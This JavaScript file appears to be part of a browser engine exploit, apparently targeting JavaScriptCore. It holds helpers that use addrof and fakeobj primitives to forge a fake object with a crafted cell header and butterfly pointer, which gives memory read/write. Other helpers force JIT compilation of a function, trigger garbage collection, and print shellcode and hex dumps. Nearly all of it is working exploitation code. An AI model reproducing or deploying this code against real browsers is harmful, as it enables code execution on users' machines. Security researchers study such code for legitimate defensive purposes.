function printf(message, status = 1) {
  let prefixes = [
    "-",
    "*",
    "+"
  ];
  port.postMessage(`[${prefixes[status]}] ${message}`);
}

// Trigger GC
function gc(n=10000) {
  let tmp = [];
  for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
}

function calculateChunkCount(length) {
  let chunks = 0;
  let total = 8;
  while (total < length) {
    total += 8;
  }
  chunks = total/8;
  return chunks;
}

let doubleArrayCellHeader = new Int64(0x0108230700000000); // Accurately represented somehow even over 2^53.
const kBoxedDoubleOffset = new Int64(0x0002000000000000);

function createJSObjectMirror(target) {
  let _internal = {
    jsCellHeader: doubleArrayCellHeader.sub(kBoxedDoubleOffset).asDouble(),
    butterfly: target
  };

  let _internal_address = primitives.addrof(_internal)
  let _internal_object = primitives.fakeobj(_internal_address.add(0x10));

  return { // objectMirror
    address: _internal_address,
    objectMetadata: {
      _internal,
  
      get jsCellHeader() {
        return Int64.fromDouble(this._internal.jsCellHeader);
      },
      set jsCellHeader(newHeader) { // int64
        this._internal.jsCellHeader = newHeader.asDouble();
      },
  
      get butterfly() {
        return this._internal.butterfly;
      },
      set butterfly(newButterfly) {
        this._internal.butterfly = newButterfly;
      }
    },
    butterflyMetadata: {
      _internal: _internal_object,
      get jsCellHeader() {
        return Int64.fromDouble(this._internal[0]);
      },
      set jsCellHeader(newHeader) {
        this._internal[0] = newHeader.asDouble();
      },
  
      get butterfly() {
        return Int64.fromDouble(this._internal[1]);
      },
  
      set butterfly(newButterfly) {
        // This is because it is interpreted as an address.
        this._internal[1] = newButterfly.asDouble();
      }
    }
  };
}

function compileFunction() {
    function compiledFunction(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }

    for (var i = 0; i < 1000; i++) {
        compiledFunction(i);
    }
    for (var i = 0; i < 1000; i++) {
        compiledFunction(i);
    }
    // for (var i = 0; i < 10000; i++) {
    //     compiledFunction(i);
    // }

    return compiledFunction;
}

function printRawAssembly(mem) {
    let del = "-".repeat(10)
    let val = `${del} Shellcode start ${del}\n`;
    val += String.fromCharCode(...mem);
    printf(val);
    printf(`${del} Shellcode end ${del}`);
}

function printHexDump(data) {
    let del = "-".repeat(10)
    printf(`${del} Hex Dump Start ${del}\n${hexdump(data)}`);
    printf(`${del} Hex Dump End ${del}`);
}